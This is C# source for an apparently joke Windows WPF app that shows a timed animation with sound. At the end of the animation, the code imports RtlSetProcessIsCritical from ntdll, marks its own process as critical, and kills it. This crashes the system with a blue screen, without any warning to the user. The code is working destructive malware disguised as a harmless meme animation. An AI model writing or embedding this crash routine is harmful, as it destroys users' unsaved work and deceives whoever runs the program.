using System;
using System.Threading.Tasks;
using System.Windows;
using System.Media;
using System.Runtime.InteropServices;

namespace Yuuker
{
    public partial class MainWindow : Window
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
        public MainWindow()
        {
            InitializeComponent();
            yukko1.Opacity = 0;
            circle.Visibility = Visibility.Hidden;
            osaka.Visibility = Visibility.Hidden;
            pagi.Visibility = Visibility.Hidden;
            Script();
        }
        public async void Script()
        {
            await Task.Delay(1000);
            SoundPlayer sp = new SoundPlayer("brainrot.wav");
            sp.Play();
            //0,0
            while(yukko1.Opacity < 1)
            {
                yukko1.Opacity += 0.01;
                await Task.Delay(10);
            }
            //1,0
            await Task.Delay(579);
            //2,079
            circle.Visibility = Visibility.Visible;
            await Task.Delay(171);
            //2,250
            circle.Visibility = Visibility.Hidden;
            await Task.Delay(67);
            //2,317
            circle.Visibility = Visibility.Visible;
            await Task.Delay(153);
            //2,470
            circle.Visibility = Visibility.Hidden;
            await Task.Delay(74);
            //2,544
            circle.Visibility = Visibility.Visible;
            CircleFadeout();
            await Task.Delay(700);
            osaka.Visibility = Visibility.Visible;
            //3,5
            await Task.Delay(1300);
            pagi.Visibility = Visibility.Visible;
            //4,8
            await Task.Delay(2500);
            System.Diagnostics.Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public async void CircleFadeout()
        {
            while(circle.Opacity > 0)
            {
                circle.Opacity -= 0.01;
                await Task.Delay(10);
            }
            circle.Visibility = Visibility.Hidden;
            circle.Opacity = 1;
        }
    }
}
